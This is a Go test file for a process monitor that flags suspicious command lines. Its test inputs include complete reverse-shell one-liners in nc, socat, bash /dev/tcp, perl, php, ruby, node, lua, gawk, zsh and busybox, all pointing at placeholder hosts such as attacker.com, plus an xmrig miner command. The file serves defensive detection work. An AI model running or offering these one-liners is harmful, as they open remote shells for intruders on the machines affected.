package monitor

import (
	"os"
	"path/filepath"
	"testing"
)

// helper: run matchSuspiciousExec against the compiled-in default patterns.
func match(cmd string) string {
	return matchSuspiciousExec(cmd, defaultExecPatterns)
}

func TestMatchSuspiciousExec_PythonSocket(t *testing.T) {
	cmd := "python3 -c import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
	if p := match(cmd); p != "python3-socket" {
		t.Errorf("cmd=%q: got %q, want python3-socket", cmd, p)
	}
}

func TestMatchSuspiciousExec_NcExec(t *testing.T) {
	cmd := "nc -e /bin/sh 10.0.0.1 4444"
	if p := match(cmd); p != "nc-exec" {
		t.Errorf("cmd=%q: got %q, want nc-exec", cmd, p)
	}
}

func TestMatchSuspiciousExec_SocatExec(t *testing.T) {
	cmd := "socat tcp:10.0.0.1:4444 exec:/bin/bash"
	if p := match(cmd); p != "socat-exec" {
		t.Errorf("cmd=%q: got %q, want socat-exec", cmd, p)
	}
}

func TestMatchSuspiciousExec_SocatSystem(t *testing.T) {
	cmd := "socat openssl:attacker:443 system:sh"
	if p := match(cmd); p != "socat-system" {
		t.Errorf("cmd=%q: got %q, want socat-system", cmd, p)
	}
}

func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
	cmd := "/tmp/xmrig --pool pool.minexmr.com:4444"
	if p := match(cmd); p != "xmrig" {
		t.Errorf("cmd=%q: got %q, want xmrig", cmd, p)
	}
}

func TestMatchSuspiciousExec_BashTcpRedirect(t *testing.T) {
	cmd := "bash -c 'exec /dev/tcp/10.0.0.1/4444'"
	if p := match(cmd); p != "bash-tcp-redirect" {
		t.Errorf("cmd=%q: got %q, want bash-tcp-redirect", cmd, p)
	}
}

func TestMatchSuspiciousExec_PerlSocket(t *testing.T) {
	cmd := "perl -MIO::Socket -e '$s=IO::Socket::INET->new(...)'"
	if p := match(cmd); p != "perl-socket" {
		t.Errorf("cmd=%q: got %q, want perl-socket", cmd, p)
	}
}

func TestMatchSuspiciousExec_PhpFsockopen(t *testing.T) {
	cmd := "php -r '$sock=fsockopen(\"attacker.com\",12345);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'"
	if p := match(cmd); p != "php-fsockopen" {
		t.Errorf("cmd=%q: got %q, want php-fsockopen", cmd, p)
	}
}

func TestMatchSuspiciousExec_RubySocket(t *testing.T) {
	cmd := "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	if p := match(cmd); p != "ruby-socket" {
		t.Errorf("cmd=%q: got %q, want ruby-socket", cmd, p)
	}
}

func TestMatchSuspiciousExec_PerlSocketConnect(t *testing.T) {
	cmd := "perl -e 'use Socket;$i=\"attacker.com\";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
	if p := match(cmd); p != "perl-socket-connect" {
		t.Errorf("cmd=%q: got %q, want perl-socket-connect", cmd, p)
	}
}

func TestMatchSuspiciousExec_NodeReverseShell(t *testing.T) {
	cmd := "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(12345, \"attacker.com\", function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
	if p := match(cmd); p != "node-reverse-shell" {
		t.Errorf("cmd=%q: got %q, want node-reverse-shell", cmd, p)
	}
}

func TestMatchSuspiciousExec_LuaSocket(t *testing.T) {
	cmd := "lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(\"attacker.com\",12345); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
	if p := match(cmd); p != "lua-socket" {
		t.Errorf("cmd=%q: got %q, want lua-socket", cmd, p)
	}
}

func TestMatchSuspiciousExec_GawkInet(t *testing.T) {
	cmd := "gawk 'BEGIN { s = \"/inet/tcp/0/attacker.com/12345\"; while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
	if p := match(cmd); p != "gawk-inet" {
		t.Errorf("cmd=%q: got %q, want gawk-inet", cmd, p)
	}
}

func TestMatchSuspiciousExec_ZshNetTcp(t *testing.T) {
	cmd := "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
	if p := match(cmd); p != "zsh-net-tcp" {
		t.Errorf("cmd=%q: got %q, want zsh-net-tcp", cmd, p)
	}
}

func TestMatchSuspiciousExec_BusyboxNcExec(t *testing.T) {
	cmd := "busybox nc -e /bin/sh attacker.com 12345"
	if p := match(cmd); p != "busybox-nc-exec" {
		t.Errorf("cmd=%q: got %q, want busybox-nc-exec", cmd, p)
	}
}

// TestMatchSuspiciousExec_Arg0Guard verifies that patterns only fire when
// argv[0] (the actual executable) matches — not when suspicious keywords appear
// only in the arguments of a different program (e.g. bash -c '... python socket.socket').
func TestMatchSuspiciousExec_Arg0Guard(t *testing.T) {
	cases := []struct {
		cmd  string
		want string
	}{
		// bash running a python snippet — must NOT trigger python-socket
		{"bash -c 'python3 -c socket.socket'", ""},
		// bash -i should not trigger any pattern now that bash-interactive is removed
		{"bash -i", ""},
		{"/bin/bash -i", ""},
		// nc with socket keyword in arg, but nc -e is the real pattern
		{"bash -c 'nc -e /bin/sh'", ""},
		// sh running python — no match
		{"sh -c 'import socket; socket.socket()'", ""},
		// bash wrapping php — must NOT trigger php-fsockopen
		{"bash -c 'php -r fsockopen(\"a\",1234)'", ""},
		// sh wrapping node — must NOT trigger node-reverse-shell
		{"sh -c 'node -e child_process net'", ""},
	}
	for _, tc := range cases {
		got := match(tc.cmd)
		if got != tc.want {
			t.Errorf("cmd=%q: got %q, want %q", tc.cmd, got, tc.want)
		}
	}
}

func TestMatchSuspiciousExec_Benign(t *testing.T) {
	benign := []string{
		"bash --version",
		"python3 -c 'print(1)'",
		"/usr/bin/sh /etc/init.d/cron start",
		"nc -z localhost 80",
		"",
	}
	for _, cmd := range benign {
		if p := match(cmd); p != "" {
			t.Errorf("cmd=%q: expected no match, got %q", cmd, p)
		}
	}
}

func TestEvidenceString_ProcEvent(t *testing.T) {
	e := Evidence{ProcEvent: &ProcEventThreat{PID: 1234, Pattern: "bash-tcp-redirect"}}
	want := "proc:1234:bash-tcp-redirect"
	if s := e.String(); s != want {
		t.Errorf("Evidence.String() = %q, want %q", s, want)
	}
}

func TestLoadExecPatterns_CloneAbsent(t *testing.T) {
	// Pass a nonexistent dir — should return defaults.
	tmp := t.TempDir()
	patterns := loadExecPatterns(filepath.Join(tmp, "nonexistent-gtfobins"))
	if len(patterns) == 0 {
		t.Fatal("loadExecPatterns returned empty slice when clone is absent")
	}
	// Verify at least one known default is present.
	found := false
	for _, p := range patterns {
		if p.Name == "nc-exec" {
			found = true
		}
	}
	if !found {
		t.Error("compiled-in nc-exec pattern missing from defaults")
	}
}

func TestLoadExecPatterns_ClonePresent(t *testing.T) {
	// Set up a minimal fake GTFOBins clone with one binary YAML file.
	tmp := t.TempDir()
	cloneDir := filepath.Join(tmp, "gtfobins")
	binDir := filepath.Join(cloneDir, "_gtfobins")
	if err := os.MkdirAll(binDir, 0o755); err != nil {
		t.Fatal(err)
	}
	// Minimal GTFOBins YAML for a fictional binary "frobnicator".
	yaml := `---
functions:
  reverse-shell:
  - code: |-
      frobnicator --connect attacker.com 12345 --exec /bin/sh
`
	if err := os.WriteFile(filepath.Join(binDir, "frobnicator"), []byte(yaml), 0o644); err != nil {
		t.Fatal(err)
	}

	patterns := loadExecPatterns(cloneDir)

	// The GTFOBins-derived pattern must be present.
	foundDerived := false
	for _, p := range patterns {
		if p.Name == "frobnicator-reverse-shell" {
			foundDerived = true
		}
	}
	if !foundDerived {
		t.Error("GTFOBins-derived frobnicator-reverse-shell pattern not found in merged result")
	}

	// Compiled-in defaults whose names aren't in the clone must still appear.
	foundDefault := false
	for _, p := range patterns {
		if p.Name == "nc-exec" {
			foundDefault = true
		}
	}
	if !foundDefault {
		t.Error("compiled-in nc-exec pattern missing from merged result")
	}
}

// TestMatchSuspiciousExec_Arg0CaseInsensitive verifies that p.Arg0 matching is
// case-insensitive so upper-case binary names in patterns still match lowercased
// argv[0] values extracted from real process command lines.
func TestMatchSuspiciousExec_Arg0CaseInsensitive(t *testing.T) {
	upperArg0Pattern := execPattern{
		Name:     "upper-test",
		Arg0:     "PYTHON3",
		Keywords: []string{"socket"},
	}
	patterns := []execPattern{upperArg0Pattern}

	cmd := "python3 -c import socket; s = socket.socket()"
	got := matchSuspiciousExec(cmd, patterns)
	if got != "upper-test" {
		t.Errorf("matchSuspiciousExec with upper-case Arg0 pattern: got %q, want %q", got, "upper-test")
	}
}

func TestGTFOBinsStripPlaceholders(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		// Trailing slash preserved after stripping attacker placeholder + port.
		{"/dev/tcp/attacker.com/12345", "/dev/tcp/"},
		// Trailing slash preserved after stripping a numeric local-port component.
		{"/inet/tcp/0/attacker.com/12345", "/inet/tcp/"},
		// Pure placeholder token returns empty.
		{"attacker.com", ""},
		// Non-placeholder token passes through unchanged.
		{"fsockopen", "fsockopen"},
		// Numeric suffix without slash is stripped correctly.
		{"socat/12345", "socat"},
		// Regression (issue #505): a token where one placeholder is a substring
		// of an earlier one ("attacker" inside "attacker.com") and the first
		// match shortens the token below the second match's index. Must yield the
		// structural prefix, not panic with "slice bounds out of range [:12]".
		{"tcp-connect:attacker.com:12345", "tcp-connect"},
		{"TCP-CONNECT:ATTACKER.COM:12345", "tcp-connect"},
		{"udp:attacker:9999", "udp"},
	}
	for _, tc := range cases {
		got := gtfobinsStripPlaceholders(tc.in)
		if got != tc.want {
			t.Errorf("gtfobinsStripPlaceholders(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
